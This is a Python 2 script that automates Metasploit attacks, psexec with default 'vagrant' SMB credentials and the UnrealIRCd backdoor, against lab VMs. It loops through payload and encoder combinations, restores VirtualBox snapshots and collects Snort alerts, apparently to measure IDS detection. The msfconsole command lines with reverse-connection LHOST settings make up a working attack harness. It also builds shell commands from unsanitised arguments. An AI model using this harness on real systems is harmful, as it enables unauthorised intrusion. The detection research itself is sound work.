#!/usr/bin/env python2
import sys
import subprocess
import time
import os

# When you run this:
# 1. >> create a results directory in /root/_EXP/
# 2. >> restart ssh on Kali
# 3. >> start Snort (listen on victim interface):
# snort -c /etc/snort/snort2970Adapted.conf -l /root/_EXP/<dir> -A full -i vboxnet<X> -k none -de -b

# snort -c /etc/snort/snort2970Adapted.conf -l /root/_EXP/<dir> -A full -i vboxnet<X> -k none -de --process-all-events

# Run like this for Windows:
# python _exploit.py windows/smb/psexec payloads_test encoders_test 23_test80_1 192.168.60.60 vm_name snapshot_name
# Run like this for Ubuntu:
# python _exploit.py exploit/unix/irc/unreal_ircd_3281_backdoor unreal_ircd_3281_backdoor_payloads unreal_ircd_3281_backdoor_encoders 28_1 192.168.50.50 Metasploitable3-ub1404 snapshot1


if len(sys.argv) != 8:
    print(sys.argv)
    sys.exit("Usage: python _exploit.py {{exploit}} {{payloads_file}} {{encoders_file}} {{output_dir}} {{target_IP}} "
           "{{vm_name}} {{snapshot_name}}".format(os.path.basename(__file__)))


exploit = str(sys.argv[1])
payloads_file = str(sys.argv[2])
encoders_file = str(sys.argv[3])
results_dir = str(sys.argv[4])
remotehost = str(sys.argv[5])
localhost = '192.168.70.70'
vm_name = str(sys.argv[6])
snapshot_name = str(sys.argv[7])
# skip_payloads_file = str(sys.argv[4])

# init output files/dirs
script_output_file = '/root/_EXP/' + results_dir + '/script_output'
subprocess.call('touch ' + script_output_file, shell=True)
snort_alert_file = '/root/_EXP/' + results_dir + '/alert'
snort_alert_copy_dir = '/root/_EXP/' + results_dir + '/alerts'
subprocess.call('mkdir ' + snort_alert_copy_dir, shell=True)
msf_output_file = '/root/_EXP/' + results_dir + '/msf_output'
subprocess.call('touch ' + msf_output_file, shell=True)

# read in the payloads and encoders to test
all_payloads = []
all_encoders = []
for input_file in [payloads_file, encoders_file]:
    read_file = open(input_file, 'r')
    all_lines = read_file.read().splitlines()
    read_file.close()
    for line in all_lines:
        if input_file == payloads_file:
            all_payloads.append(line.split()[0])
        else:
            all_encoders.append(line.split()[0])

# read in the payloads to skip
# skip_payloads = []
# fd_skip_payloads_file = open(skip_payloads_file, 'r')
# all_lines = fd_skip_payloads_file.read().splitlines()
# for line in all_lines:
#     skip_payloads.append(line)

# print some statistics
fd_script_output_file = open(script_output_file, 'a')
fd_script_output_file.write('----------')
fd_script_output_file.write('\nnr. of payloads is ' + str(len(all_payloads)))
fd_script_output_file.write('\nnr. of encoders is ' + str(len(all_encoders)))
total_combinations = len(all_payloads) * len(all_encoders)
fd_script_output_file.write('\nnr. of combinations is ' + str(total_combinations))
fd_script_output_file.flush()

# run the tests (one payload at a time)
payload_counter = 1
current_test_counter = 1
fd_msf_output_file = open(msf_output_file, 'a')

# snapshots
# VBoxManage list vms
# VBoxManage list runningvms
# VBoxManage snapshot metasploitable3_win2k8_1526903353379_57042 list
# VBoxManage snapshot metasploitable3_win2k8_1526903353379_57042 list
# VBoxManage controlvm metasploitable3_win2k8_1526903353379_57042 savestate
# VBoxManage snapshot metasploitable3_win2k8_1526903353379_57042 restore Snapshot-23mei
# VBoxManage startvm metasploitable3_win2k8_1526903353379_57042 --type headless


def restore_snapshot():
    subprocess.call('VBoxManage controlvm {0} poweroff'.format(vm_name), shell=True)
    subprocess.call('VBoxManage snapshot {0} restore {1}'.format(vm_name, snapshot_name), shell=True)
    subprocess.call('VBoxManage startvm {0} --type headless'.format(vm_name), shell=True)


restore_snapshot()
time.sleep(15)

for payload in all_payloads:
    fd_script_output_file.write('\n----------')
    fd_script_output_file.write('\nCurrently at payload: ' + str(payload_counter) + '/' + str(len(all_payloads)))
    fd_script_output_file.write('\n----------')
    fd_script_output_file.flush()
    for encoder in all_encoders:
        # if payload in skip_payloads:
        #    continue
        fd_script_output_file.write('\n----------')
        fd_script_output_file.write('\nRunning test ' + str(current_test_counter) + '/' + str(total_combinations))
        fd_script_output_file.write('\n----------')
        fd_script_output_file.flush()

        # restore snapshot
        if current_test_counter % 50 == 0:
            restore_snapshot()
            time.sleep(15)

        # run a test
        msf_cmd = 'msfconsole -q -x "use ' + exploit + '; setg RHOST ' + remotehost + '; set SMBPass vagrant; set SMBUser vagrant;'
        msf_cmd += ' set PAYLOAD ' + payload + '; setg LHOST ' + localhost + '; set ENCODER ' + encoder + '; run -z; sessions -K; exit;"'
        ssh_cmd = 'ssh -i msf root@192.168.70.70 ' + "'" + msf_cmd + "; service ssh restart;'"
        fd_script_output_file.write('\n' + ssh_cmd + '\n')
        fd_script_output_file.flush()
        subprocess.call(ssh_cmd, shell=True, stdout=fd_msf_output_file, stderr=subprocess.STDOUT)
        echo_delimiter = 'echo "----------";'
        subprocess.call(echo_delimiter, shell=True, stdout=fd_msf_output_file, stderr=subprocess.STDOUT)
        time.sleep(1)

        # copy snort alert file
        payload_name = payload.replace('/', '-')
        encoder_name = encoder.replace('/', '-')
        snort_alert_name = payload_name + '---' + encoder_name
        subprocess.call('cp ' + snort_alert_file + ' ' + snort_alert_copy_dir + '/' + snort_alert_name, shell=True)
        subprocess.call("echo '' > " + snort_alert_file, shell=True)
        current_test_counter += 1
    payload_counter += 1

fd_script_output_file.write('\n----------')
fd_script_output_file.write('\nFINISHED\n')
fd_script_output_file.flush()
fd_msf_output_file.close()
fd_script_output_file.close()
